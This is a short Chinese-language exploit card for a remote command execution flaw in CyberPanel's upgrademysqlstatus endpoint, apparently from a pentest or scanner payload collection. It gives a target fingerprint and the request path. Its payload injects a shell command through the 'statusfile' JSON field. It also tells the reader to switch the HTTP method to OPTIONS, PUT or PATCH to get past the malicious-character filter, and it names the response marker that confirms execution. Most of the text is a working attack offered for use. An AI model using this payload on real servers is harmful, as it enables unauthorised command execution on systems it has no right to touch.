# Cyber​​Panelupgrademysqlstatus远程命令执行漏洞

Cyber​​Panelupgrademysqlstatus ｜ 命令执行 ｜ —
- **指纹**：`app="CyberPanel"`
- **请求**：`OPTIONS /dataBases/upgrademysqlstatus HTTP/1.1`

**Payload**
```
{"statusfile":"/dev/null; id; #"}
请求头需要换成 OPTIONS/ PUT/ PATCH 等作为HTTP方法，绕过恶意字符过滤器
```
- **响应特征**：200 uid=